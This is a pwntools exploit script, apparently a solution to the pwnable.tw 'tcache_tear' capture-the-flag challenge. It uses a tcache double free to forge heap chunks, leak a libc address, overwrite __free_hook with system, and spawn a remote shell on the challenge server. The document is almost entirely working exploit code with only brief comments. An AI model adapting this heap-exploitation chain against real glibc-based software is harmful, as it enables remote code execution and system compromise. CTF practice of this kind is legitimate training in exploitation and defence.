from pwn import *

server = remote('chall.pwnable.tw', 10207)
elf = ELF('./tcache_tear')
libc = ELF('./libc.so')

def malloc(size, data):
    server.recvuntil('Your choice :')
    server.sendline('1')
    server.recvuntil('Size:')
    server.sendline(str(size))
    server.recvuntil('Data:')
    server.sendline(data)

def free():
    server.recvuntil('Your choice :')
    server.sendline('2')

def info():
    server.recvuntil('Your choice :')
    server.sendline('3')

name_addr = 0x602060
ptr_addr = 0x602088

server.recvuntil('Name:')
server.sendline('0xdeadbeef')

# make fake chunk to avoid fake name chunk unlink and free check
malloc(0x70, '0xdeadbeef')
free()
free()
malloc(0x70, p64(name_addr+0x500-0x10))
malloc(0x70, '0xdeadbeef')
malloc(0x70, p64(0)+p64(0x21)+p64(0)*3+p64(0x21))

# make fake name chunk
malloc(0x60, '0xdeadbeef')
free()
free()
malloc(0x60, p64(name_addr-0x10))
malloc(0x60, '0xdeadbeef')
# overwrite ptr pointer to avoid free check
malloc(0x60, p64(0)+p64(0x501)+((ptr_addr-name_addr)/8)*p64(0)+p64(name_addr))

# leak libc address
free()
info()
server.recvuntil('Name :')
main_arena_addr = u64(server.recv(8)) - 0x60
log.success('main_arena_addr: {}'.format(hex(main_arena_addr)))
libc.address = main_arena_addr - 0x3ebc40
log.success('libc address: {}'.format(hex(libc.address)))

# overwrite free_hook
free_hook_addr = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
malloc(0x50, '0xdeadbeef')
free()
free()
malloc(0x50, p64(free_hook_addr))
malloc(0x50, '0xdeadbeef')
malloc(0x50, p64(system_addr))
malloc(0x40, '/bin/sh\x00')
free()

server.interactive()